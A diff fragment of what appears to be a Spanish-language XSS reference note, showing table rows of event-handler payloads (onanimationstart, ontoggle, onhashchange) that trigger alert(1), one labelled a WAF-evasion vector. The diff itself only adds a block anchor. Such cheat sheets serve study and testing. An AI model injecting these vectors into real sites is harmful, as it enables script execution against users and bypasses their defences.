@@ -28,6 +28,7 @@ ___
 | <br><br><pre><code>`onanimationstart`</code></pre> | <br><pre><code>`<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">`</code></pre> |            <br>**Automático (Avanzado).** Vector de evasión de WAF. Vincula una animación CSS vacía a un elemento cualquiera, disparando el evento en cuanto el motor de estilos la procesa.             |
 |       <br><pre><code>`ontoggle`</code></pre>       |                          <br><pre><code>`<details open ontoggle="alert(1)">`</code></pre>                           |              <br>**Automático.** El atributo `open` fuerza el cambio de estado del elemento `<details>` al renderizarse, lo que inmediatamente desencadena el manejador `ontoggle`.<br><br>              |
 |     <br><pre><code>`onhashchange`</code></pre>     |                   <br><pre><code>`<body onhashchange="alert(1)"><a href="#x">Ir</a>`</code></pre>                   |                 <br>**Interactivo.** Se ejecuta cuando cambia el fragmento de la URL. Muy efectivo en aplicaciones de página única (SPA) donde la navegación se basa en anclas.<br><br>                  |
+^xss-eventos
 
 ### Inyección en Contextos Preexistentes
 
